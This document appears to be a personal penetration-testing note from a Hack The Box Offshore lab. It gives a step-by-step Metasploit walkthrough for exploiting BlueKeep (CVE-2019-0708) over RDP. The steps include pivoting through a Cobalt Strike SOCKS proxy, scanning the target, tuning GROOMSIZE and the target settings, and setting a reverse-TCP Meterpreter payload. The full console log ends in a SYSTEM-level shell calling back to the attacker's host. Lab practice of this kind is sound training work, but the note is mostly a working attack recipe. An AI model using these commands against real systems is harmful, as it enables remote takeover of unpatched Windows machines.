---
created_date: 27 October 2023
updated_date: TBD
type: windows
tags:
  - "#offshore"
  - "#bluekeep"
  - "#cve-2019-0708"
---

url links:
https://www.rapid7.com/blog/post/2019/09/06/initial-metasploit-exploit-module-for-bluekeep-cve-2019-0708/
https://github.com/rapid7/metasploit-framework/issues/13732

note links:
`offshore GROOMSIZE Modification:` [[Penetration Testing v2/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/to_WS02/blue_keep_check_&_Exploit]]

tips:
- `msfconsole` module has pre designated targets to try, however it is very common to have to modify the `GROOMSIZE` by utilizing `set GROOMSIZE 50`, `set GROOMSIZE 100`, (50/100 = MB) etc.. to ensure proper exploitation of the victim machine.
# Vulnerabilities:
vulnerable to windows versions listed below:
```
    1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)                                                                                               
    2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)                                                                                           
    3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)                                                                                              
    4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)                                                                                              
    5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)                                                                                            
    6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)                                                                                                
    7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)                                                                                                    
		8   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)  
```
required vulnerable ports:
```
3389 - Remote Desktop Protocol
```
The `msfconsole` version of blue keep `windows/rdp/cve_2019_0708_bluekeep_rce` works under specific settings listed below:
# Through Proxy
if throwing blue_Keep against an internal network, you must set a proxy in `msfconsole`, first go into cobalt strike and setup a proxy on desire machine
```bash
socks5 2222
```
in cobalt strike navigate to host with beacon -> pivots -> tunnel ang copy the command that is shown on the screen
![[Pasted image 20231027142400.png]]
open up `msfconsole` copy and paste the tunnel command
```bash
msf6 > setg Proxies socks5:127.0.0.1:2222
Proxies => socks5:127.0.0.1:2222
```
once done with `msfconsole` proxy use command
```bash
msf6 > unset Proxy
Unsetting Proxy...
```
search `blue keep`
```bash
msf6 > search bluekeep

Matching Modules
================

   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/cve_2019_0708_bluekeep    2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
   1  exploit/windows/rdp/cve_2019_0708_bluekeep_rce  2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
```
`use 0` to test if the exploit will work against desired machine
the only option needed to use is `set rhosts <desired victim ip>`
```bash
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set rhosts 172.16.1.101
rhosts => 172.16.1.101
```
`run`
```bash
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run

[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
the host is vulnerable, we can now attempt to throw the exploit
```bash
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > search blue keep

Matching Modules
================

   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/cve_2019_0708_bluekeep    2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
   1  exploit/windows/rdp/cve_2019_0708_bluekeep_rce  2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```
`use 1`
```
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > use 1
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > 
```
`show options`
```bash
set RHOSTS <victim IP>
set LHOST <kali IP>
set LPORT <4444> # keep in mind AV, might have to use 443 80 or 8443
```
`show targets`
- here you set the desired target if you know if its running in a VM or not, if its not `target 1` has worked for me.
```
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic targeting via fingerprinting
    1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
    2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)
    3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)
    4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)
    5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)
    6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)
    7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)
    8   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)
```
`show advanced`
```bash
set GROOMSIZE 100
set ReverseAllowProxy True
```
`run`
```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set GROOMSIZE 100                                                                                
GROOMSIZE => 100                                                                                                                                        
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 1                                                                                     
target => 1                                                                                                                                             
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run                                                                                              
                                                                                                                                                        
[*] Started reverse TCP handler on 10.10.14.39:8443                                                                                                     
[*] 172.16.1.101:3389 - Running automatic check ("set AutoCheck false" to disable)                                                                      
[*] 172.16.1.101:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check                                                                     
[+] 172.16.1.101:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.                            
[*] 172.16.1.101:3389     - Scanned 1 of 1 hosts (100% complete)                                                                                        
[+] 172.16.1.101:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.                                
[*] 172.16.1.101:3389 - Using CHUNK grooming strategy. Size 100MB, target address 0xfffffa8009c00000, Channel count 1.                                  
[!] 172.16.1.101:3389 - <---------------- | Entering Danger Zone | ---------------->                                                                    
[*] 172.16.1.101:3389 - Surfing channels ...                                                                                                            
[*] 172.16.1.101:3389 - Lobbing eggs ...                                                                                                                
[*] 172.16.1.101:3389 - Forcing the USE of FREE'd object ...                                                                                            
[!] 172.16.1.101:3389 - <---------------- | Leaving Danger Zone | ---------------->                                                                     
[*] Sending stage (200774 bytes) to 10.10.110.3                                                                                                         
[*] Meterpreter session 1 opened (10.10.14.39:8443 -> 10.10.110.3:37353) at 2023-10-27 13:08:19 -0400                                                   
                                                                                                                                                        
meterpreter > getuid                                                                                                                                    
Server username: NT AUTHORITY\SYSTEM                                                                                                                    
```
